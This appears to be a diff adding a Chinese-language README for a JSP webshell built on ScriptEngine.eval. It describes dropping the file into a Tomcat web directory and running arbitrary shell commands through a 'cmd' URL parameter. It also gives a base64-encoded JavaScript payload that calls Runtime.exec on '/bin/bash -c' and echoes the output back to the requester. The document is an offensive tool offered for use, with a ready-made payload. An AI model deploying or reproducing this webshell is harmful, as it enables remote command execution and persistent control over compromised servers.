@@ -1,0 +1,17 @@
+### 精简一句话ScriptEngine.eval的JSP Webshell
+
+
+使用：
+```
+1.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT
+
+2.
+
+在浏览器访问19.jsp，并使用参数cmd传入需要远程执行的命令，例：http://127.0.0.1:8080/19.jsp?cmd=whoami
+
+或
+
+在浏览器访问19_2.jsp，并使用参数cmd传入需要远程执行的命令，code传入base64编码的js脚本，例：http://127.0.0.1:8080/19_2.jsp?cmd=whoami&code=cz1bM107c1swXT0nL2Jpbi9iYXNoJztzWzFdPSctYyc7c1syXT1yZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIik7cHJvY2Vzcz1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTtwcm9jZXNzLndhaXRGb3IoKTtpbnB1dFN0cmVhbT1wcm9jZXNzLmdldElucHV0U3RyZWFtKCk7dmFyIEJ5dGVBcnJheT1KYXZhLnR5cGUoJ2J5dGVbXScpO3ZhciBieXRlcz1uZXcgQnl0ZUFycmF5KGlucHV0U3RyZWFtLmF2YWlsYWJsZSgpKTtpbnB1dFN0cmVhbS5yZWFkKGJ5dGVzKTtyZXNwb25zZS5nZXRPdXRwdXRTdHJlYW0oKS53cml0ZShieXRlcyk7
+
+3.服务器将会执行相应的shell命令，最后回显
+```
